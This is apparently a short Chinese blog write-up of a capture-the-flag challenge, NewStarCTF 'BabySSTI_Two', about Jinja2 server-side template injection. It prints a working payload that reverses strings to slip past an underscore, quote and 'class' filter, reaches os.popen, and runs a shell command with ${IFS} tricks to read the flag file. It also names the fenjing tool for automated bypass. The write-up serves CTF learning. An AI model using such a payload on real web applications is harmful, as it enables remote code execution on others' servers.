---
title: '[NewStarCTF 公开赛赛道]BabySSTI_Two'
date: 2025-01-29 20:14:17
tags: ssti
categories: 刷题笔记
---

## [NewStarCTF 公开赛赛道]BabySSTI_Two

根据题目提示，这是一个ssti的题

![image-20250202201503729](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022015974.png)

经过测试，我们发现这是个jinjia2的模版，并且过滤了下划线和双引号和class

我们可以用字符串逆序来绕过 

![image-20250202202006134](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502022020221.png)

```
?name={{''['__ssalc__'[::-1]]['__sesab__'[::-1]][0]['__sessalcbus__'[::-1]]()[117]['__tini__'[::-1]]['__slabolg__'[::-1]]['nepop'[::-1]]('ca${Z}t${IFS}/fl${Z}ag_in_h3r3_52daad').read()}}
```

更简单的，用fenjing进行爆破
